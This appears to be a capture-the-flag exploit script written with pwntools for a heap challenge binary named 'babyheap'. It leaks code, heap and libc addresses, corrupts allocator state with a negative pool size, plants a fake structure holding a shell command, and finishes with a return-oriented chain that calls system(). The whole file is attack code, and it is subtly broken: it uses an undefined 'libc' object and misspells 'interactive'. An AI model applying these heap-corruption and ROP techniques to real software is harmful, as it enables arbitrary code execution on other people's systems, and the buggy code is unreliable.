from pwn import *

def login_and_leak_codeaddr(): 
	plt_least=0xa0a
	p.recvuntil("What's your name?")
	p.send("\n")
	p.recvuntil("Hello ")
	addr=u64(p.recv(6).ljust(8,"\x00"))
    	#print ">"*20,hex(addr)
	code_base = addr-plt_least
    	#print "code_base=",hex(code_base)
	p.recvuntil('password: ')
	p.send("Fourscore and seven years ago ou")
	return code_base

def use_the_pool(size,payload):
	p.recvuntil("use the pool? (y/n)")
	p.sendline('y')
	p.recvuntil('size of your pool: ')
	p.sendline(str(size))
	p.recvuntil('blank(?):')
	p.send(payload)
	p.recvuntil("pool used? (y/n)")
	p.sendline('y')

def leak_heap_base():
	use_the_pool(24,'A'*0x10+'\x00'*8+'\xff'*8)
	use_the_pool(-112-32-16,'B')
	use_the_pool(24,'C'*0x10)
	p.recvuntil('C'*16)
	heap_addr=u64(p.recv(6).ljust(8,"\x00"))
	heap_base=heap_addr-0xc0
	#print '>'*10,hex(heap_base)
	return heap_base

def vip():
	topchunk=heap_base+0x0f0
	poolist2=code_base+0x203020+0x40+8+8
	vip_addr=code_base+0x2030e0
	padding=vip_addr-poolist2-0x10
	offset=poolist2-topchunk-0x20-0x10-0x10
	fake=p64(code_base+0x202f50)+p32(2)+p16(2)+p16(100)+"ls\x00"
	payload=p64(heap_base+0x100)+p64(heap_base+0x100)+"A"*(vip_addr-poolist2-0x10)+p64(0x80000000)+p64(3)
	use_the_pool(24,'A'*0x10+'\x00'*8+'\xff'*8)
	use_the_pool(offset,fake)
	use_the_pool(len(payload),payload)
	p.recvuntil("left in the pool:")
	got_addr=u64(p.recv(6).ljust(8,"\x00"))
    	print "got_addr=",hex(got_addr)
	elf.address=got_addr-elf.symbols[b'puts']
    	print "libc_base",hex(elf.address)

if __name__ == "__main__":
	global heap_base
	global code_base
	elf=ELF('./libc6_2.23.so')
	p=process('./babyheap',env={"LD_PRELOAD":"./libc6_2.23.so"})
	#context.log_level="DEBUG"
	code_base=login_and_leak_codeaddr()
	print "code_base is ",hex(code_base)
	heap_offset_code=leak_heap_base()-code_base
	print "offset ",hex(heap_offset_code)

	p=process('./babyheap',env={"LD_PRELOAD":"./libc6_2.23.so"})
	#context.log_level="DEBUG"
	code_base=login_and_leak_codeaddr()
	print "2code_base is ",hex(code_base)
	heap_base=code_base+heap_offset_code
	print "Heap_base is ",hex(heap_base)
	vip()
	print p.recvuntil("Only VIP can leave some message for me: ")
	pop_rdi_ret=code_base+0x13a3
	cmd_addr=heap_base+0x100+16
	payload="A"*0x20+"B"*8
	payload+=p64(pop_rdi_ret)+p64(cmd_addr)+p64(libc.symbols[b"system"])
	p.sendline(payload)
	p.interavtive()




